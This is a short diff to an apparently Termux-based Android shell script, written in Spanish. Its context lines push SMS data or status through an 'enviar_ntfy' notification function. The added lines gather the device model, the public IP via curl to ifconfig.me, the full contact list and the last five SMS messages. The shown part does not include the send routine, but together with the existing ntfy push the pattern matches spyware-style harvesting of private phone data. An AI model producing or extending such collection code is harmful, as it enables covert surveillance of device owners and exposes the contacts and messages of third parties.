@@ -44,3 +44,15 @@ if [ -n "$SMS" ]; then
 else
     enviar_ntfy "⚠️ SMS no disponibles o sin permisos"
 fi
+
+echo "🔍 Ejecutando script..."
+
+echo "Obteniendo datos del dispositivo..."
+echo "Modelo: $(getprop ro.product.model)"
+echo "IP: $(curl -s ifconfig.me)"
+
+echo "Obteniendo contactos..."
+termux-contact-list
+
+echo "Obteniendo SMS..."
+termux-sms-list -l 5
